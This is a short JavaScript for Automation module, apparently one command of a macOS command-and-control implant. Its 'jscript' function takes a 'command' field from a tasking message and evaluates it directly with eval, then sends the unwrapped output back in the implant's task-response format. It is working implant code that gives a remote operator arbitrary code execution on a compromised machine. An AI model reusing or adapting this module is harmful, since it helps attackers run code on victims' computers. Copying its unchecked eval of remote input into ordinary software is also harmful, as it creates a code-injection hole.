exports.jscript = function(task, command, params){
	//simply eval a javascript string and return the response
	let response = "";
	try{
		let command_params = JSON.parse(params);
		if(!command_params.hasOwnProperty("command")){ return {"user_output": "Missing command parameter", "status": "error", "completed": true};}
		response = ObjC.deepUnwrap(eval(command_params['command']));
	}
	catch(error){
		return {"user_output":error.toString(), "completed": true, "status": "error"};
	}
	if(response === undefined || response === ""){
	    response = "No Command Output";
	}
	if(response === true){
	    response = "True";
	}
	if(response === false){
	    response = "False";
	}
	if(typeof(response) != "string"){
	    response = String(response);
	}
	return {"user_output":response, "completed": true};
};
